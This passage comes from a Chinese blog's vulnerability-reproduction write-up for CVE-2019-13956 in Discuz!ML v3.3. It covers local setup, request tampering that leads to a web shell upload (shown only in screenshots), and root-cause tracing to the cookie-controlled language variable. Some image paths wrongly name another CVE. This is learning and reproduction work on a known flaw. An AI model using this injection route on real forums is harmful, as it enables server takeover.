<p>先去下载了v3.3的版本：<a href="https://sourceforge.net/p/discuz-ml/code/ci/v.3.3/tarball?path=">https://sourceforge.net/p/discuz-ml/code/ci/v.3.3/tarball?path=</a></p>
<p>然后开PHPstudy往里一放即可到网页上Install</p>
<p>点击链接抓包改包</p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150139079.png" alt="image-20201112150139079"></p>
<p>可以看到缓存里的内容被更改了</p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150217140.png" alt="image-20201112150217140"></p>
<p>上传shell</p>
<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150159180.png" alt="image-20201112150159180"></p>
<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>在/upload/source/module/portal/portal_index.php文件中</p>
<p><img src="/2020/11/12/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/0x0Dcve-2019-13956/image-20201112155957305.png" alt="image-20201112155957305"></p>
<p>使用template函数处理’diy:portal/index’,然后使用include_once包含</p>
<p>include_once：</p>
<p>可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。 </p>
<p>跟进template函数：</p>
<p><img src="/2020/11/12/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/0x0Dcve-2019-13956/image-20201112160428730.png" alt="image-20201112160428730"></p>
<p>可以看到返回的是一个拼接值,以及相关的两个变量DISCUZ_LANG和DISCUZ_ROOT</p>
<p>找到它们的定义，DISCUZ_ROOT是个固定的</p>
<p><img src="/2020/11/12/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/0x0Dcve-2019-13956/image-20201112162712111.png" alt="image-20201112162712111"></p>
<p>DISCUZ_LANG和$lng有关</p>
<p><img src="/2020/11/12/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/0x0Dcve-2019-13956/image-20201112162520552.png" alt="image-20201112162520552"></p>
<p>我们可以看到$lng和cookie中的languages有关，那我们就可以控制这个变量然后改包了</p>
<p><img src="/2020/11/12/CVE-2021-24086-Windows-TCP-IP-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/0x0Dcve-2019-13956/image-20201112162914790.png" alt="image-20201112162914790"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>discuz</tag>
      </tags>
  </entry>
</search>
